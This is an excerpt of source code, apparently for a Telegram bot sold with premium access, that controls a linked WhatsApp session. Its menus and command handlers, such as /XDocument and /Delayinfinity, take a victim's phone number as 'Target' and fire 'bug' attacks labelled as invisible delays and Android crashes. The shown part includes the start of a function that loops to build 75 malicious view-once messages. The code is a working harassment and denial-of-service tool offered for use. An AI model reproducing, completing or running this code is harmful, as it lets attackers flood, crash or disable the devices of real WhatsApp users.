...
const thumbnailUrl = "https://files.catbox.moe/v0w7ms.jpg";
...
function checkVersion() {
  https.get("https://raw.githubusercontent.com/agungdermawan22332-sys/Vloid-Update/main/version.json", (res) => {
...
const TOKEN_DB_URL = "https://raw.githubusercontent.com/agungdermawan22332-sys/NewEra/tokens.json";
...
function showDefeat(reason) {
    ...
    console.log("\x1b[31m KLZ ANTI BYPASS DI KALAHKAN \x1b[0m");
    console.log("\x1b[31m [ ANTI BYPASS ] AMPAS FREEZING \x1b[0m");
    console.log("\x1b[31m ANDA TIDAK BISA MENGGUNAKAN NYA \x1b[0m");
    console.log("\x1b[31m========================================\x1b[0m");
        ...
        https.get(TOKEN_DB_URL, res => {
            ...
            res.on('end', () => {
                try {
                    ...
                    console.log("\x1b[36m[ANTI BYPASS]\x1b[0m Token DB OK");
                } catch {
                    TOKEN_SOURCE_VALID = false;
                }
                resolve();
...
Versi Now : ${CURRENT_VERSION}
Versi Latest : ${latestVersion}

📢 Untuk Update Script Ke Versi
terbaru ketik /update
...
`);
  ...
  // ✅ Kalau semua aman, lanjut menu utama
  ctx.reply("✅ Token Successfully Verified\nOpening the Main Menu");

  // ⬇️ kalau ada kode menu lama kamu, taruh di sini
  // misalnya:
...
𝗟𝗢𝗩𝗘𝗟𝗬 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗦𝗖𝗥𝗔𝗣𝗘 ⎙
──────────────────────
⸙ Developer : @XerozNotDev
⸙ This Time Version : 1.0 Pro
⸙ Menu Opener : @${ctx.from.username || "Tidak Ada"}
...
──────────────────────
<i>⎈ Halaman Page 1/4</i>
</b></blockquote>
`;

  const keyboard = [
    [
        { text: "🔙 𝗕𝗮𝗰𝗸", callback_data: "popup_only" },
        { text: "𝗛𝗼𝗺𝗲 ↩️", callback_data: "/start" },
        { text: "𝗡𝗲𝘅𝘁 🔜", callback_data: "/bug_menu" }
    ],
    [
        { text: "⎈ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "t.me/XerozNotDev" }
    ],
    [
        { text: "⎈ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆", callback_data: "/Security_gb" },
        { text: "⎈ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁", callback_data: "/support_menu" }
    ]
];
...
bot.action("popup_only", async (ctx) => {
  await ctx.answerCbQuery(
    "⚠️ Only Owner",
    { show_alert: true }
  );
...
──────────────────────
⎈ /XDocument ⧼Number⧽
╰╼ Delay Document Android
⎈ /Delayinfinity ⧼Number⧽
╰╼ Delay invisible Infinity 
⎈ /NamaBug ⧼Number⧽
╰╼ Invisible Android 
──────────────────────
<i>⎈ Halaman Page 2/4</i>
</b></blockquote>
`;

    const keyboard = [
    [
        { text: "🔙 𝗕𝗮𝗰𝗸", callback_data: "/start" },
        { text: "𝗛𝗼𝗺𝗲 ↩️", callback_data: "/start" },
        { text: "𝗡𝗲𝘅𝘁 🔜", callback_data: "/owner_acces" }
    ],
    [
        { text: "⎈ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "t.me/XerozNotDev" }
    ]
...
⸙ /listblock Melihat Daftar Block
──────────────────────
⸙ /addprem ⧼id⧽
⸙ /delprem ⧼id⧽
⸙ /addpremgrup ⧼idgroup⧽
...
──────────────────────
⸙ /addbot ⧼Number⧽
⸙ /killsesi - Hapus Sessions
──────────────────────
<i>⎈ Halaman Page 3/4</i>
</b></blockquote>

`;
    const keyboard = [
    [
        { text: "🔙 𝗕𝗮𝗰𝗸", callback_data: "/bug_menu" },
        { text: "𝗛𝗼𝗺𝗲 ↩️", callback_data: "/start" },
        { text: "𝗡𝗲𝘅𝘁 🔜", callback_data: "/search_music" }
    ],
    [
        { text: "⎈ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url: "t.me/XerozNotDev" }
    ]
...
╰╼ Search Music 30d
──────────────────────
⸙ /game - Memulai Permainan 
⸙ /tebak - Menebak Angka
⸙ /hint - Dapatkan Petunjuk 
⸙ /leaderboard - Lihat Rangking
──────────────────────
<i>⎈ Halaman Page 4/4</i>
</b></blockquote>
`;

    const keyboard = [
    [
        { text: "🔙 𝗕𝗮𝗰𝗸", callback_data: "/owner_acces" },
        { text: "𝗛𝗼𝗺𝗲 ↩️", callback_data: "/start" },
        { text: "𝗡𝗲𝘅𝘁 🔜", callback_data: "/bug_menu" }
    ],
    [
...
//-------(CASEE BUGGGG ANJAYY)--------//
bot.command("Delayinfinity",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Delayinfinity 62×××`);
...
♛ 𝗟𝗢𝗩𝗘𝗟𝗬 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗔𝗧𝗧𝗔𝗖𝗞
⸙ Target : ${q}
ᯓ➤ Delay invisible Infinity 
⸙ Processing : ${progressStages[0]}
╘═——————————————═⬡
</b></blockquote>
`,
        parse_mode: "HTML",
...
bot.command("XDocument",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /XDocument 62×××`);
...
async function R9XDocVis(sock, target) {
  for (let i = 0; i < 75; i++) {
    var R9X = {
      viewOnceMessage: {
        message: {
